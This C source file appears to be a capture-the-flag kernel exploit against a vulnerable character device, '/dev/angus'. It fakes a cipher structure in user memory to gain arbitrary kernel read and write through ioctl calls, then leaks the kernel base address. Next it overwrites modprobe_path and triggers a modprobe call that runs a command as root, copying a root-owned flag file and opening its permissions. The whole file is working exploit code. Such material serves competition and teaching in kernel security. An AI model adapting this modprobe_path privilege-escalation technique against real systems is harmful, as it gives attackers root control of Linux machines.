#include "libpwn.c"

#define DEVICE "/dev/angus"

#define MODPROBE_OFFSET 0xe37e60
#define BUFFER_SIZE 0x200

#define CMD_INIT    0x13370001
#define CMD_SETKEY  0x13370002
#define CMD_SETDATA 0x13370003
#define CMD_GETDATA 0x13370004
#define CMD_ENCRYPT 0x13370005
#define CMD_DECRYPT 0x13370006

typedef struct {
  char *key;
  char *data;
  size_t keylen;
  size_t datalen;
} XorCipher;

typedef struct {
  char *ptr;
  size_t len;
} request_t;

char key[0x8] = {0x0};
char buffer[BUFFER_SIZE];
XorCipher *fake;
int fd;

void angus_init() {
    request_t dummy = {
        .ptr = NULL,
        .len = 0
    };
    if(ioctl(fd, CMD_INIT, &dummy) < 0) {
        panic("ioctl: CMD_INIT");
    }
}

void angus_getdata(char *buffer, u64 len) {
    request_t req = {
        .ptr = buffer,
        .len = len
    };
    if(ioctl(fd, CMD_GETDATA, &req) < 0) {
        panic("ioctl: CMD_GETDATA");
    }
}

void angus_encrypt() {
    request_t dummy = {
        .ptr = NULL,
        .len = 0
    };
    if(ioctl(fd, CMD_ENCRYPT, &dummy) < 0) {
        panic("ioctl: CMD_ENCRYPT");
    }
}

void arb_read(u64 where, u64 size) {
    fake->data = (char*)where;
    fake->datalen = size;
    angus_getdata(buffer, fake->datalen);
}

u64 u64_arb_read(u64 where) {
    arb_read(where, 8);
    return ((u64*)buffer)[0];
}

void u64_arb_write(u64 where, u64 what) {
    printf("[ARB WRITE] 0x%lx = 0x%lx\n", where, what);
    u64 original_data = u64_arb_read(where);
    *((u64*)key) = (original_data ^ what);

    fake->data = (char*)where;
    fake->datalen = 8;
    fake->key = (char*)&key; // X ^ 0x0 = X
    fake->keylen = sizeof(key);

    angus_encrypt();
}

int main() {
    fd = open(DEVICE, O_RDWR);
    if (fd < 0) {
        panic("open");
    }

    fake = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_PRIVATE|MAP_ANONYMOUS|MAP_POPULATE, -1 , 0 );
    if (fake == MAP_FAILED) {
        panic("mmap");
    }

    arb_read(CPU_ENTRY_AREA+0x4, 0x8);
    kbase = ((u64*)buffer)[0] - 0x808e00;
    validate_kbase();
    info2("modprobe_path", kbase + MODPROBE_OFFSET);

    char evil_modprobe_path[] = "/tmp/pwn\x00";
    u64_arb_write(kbase+MODPROBE_OFFSET, *(u64*)evil_modprobe_path);
    u64_arb_write(kbase+MODPROBE_OFFSET+0x8, 0x0);

    modprobe_attack("cp /root/flag.txt /flag.txt; chmod 777 /flag.txt", DEFAULT_MODPROBE_TRIGGER, DEFAULT_EVIL_MODPROBE_PATH);
    system("cat /flag.txt");

    _pause_("end of exploit...");
}